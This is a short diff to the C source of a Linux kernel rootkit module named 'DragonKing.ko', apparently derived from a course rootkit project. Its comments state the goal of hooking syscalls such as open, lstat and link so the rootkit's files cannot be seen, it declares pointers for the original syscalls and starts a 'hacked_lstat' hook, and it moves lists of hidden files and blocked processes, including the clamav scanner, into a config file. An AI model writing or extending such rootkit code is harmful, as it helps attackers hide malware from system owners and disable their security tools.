@@ -14,21 +14,23 @@
 #include <linux/file.h>
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
+#include "config.h"
 
 // Portions of this code were either taken or inspired from CSE509-Rootkit
+// We need to hook functions that will keep our files from being seen.
+// Commonly this means hooking the usual suspects like open and lstat
+// However other calls like link and chown can give us away too
 
-const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};
-
-const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};
 
 asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);
 
-//asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]);
-
+asmlinkage long (*orig_link)(const char __user *existingpath, const char __user *newpath); 
 
 asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *buf);
 
+asmlinkage long (*orig_open)(const char __user *pathname, const int __user oflag, const mode_t __user mode);
 
+//Define our hacked lstat
 asmlinkage int hacked_lstat(const char __user *pathname, struct stat __user *buf){
 	char *kern_buff = NULL;
 	int i;
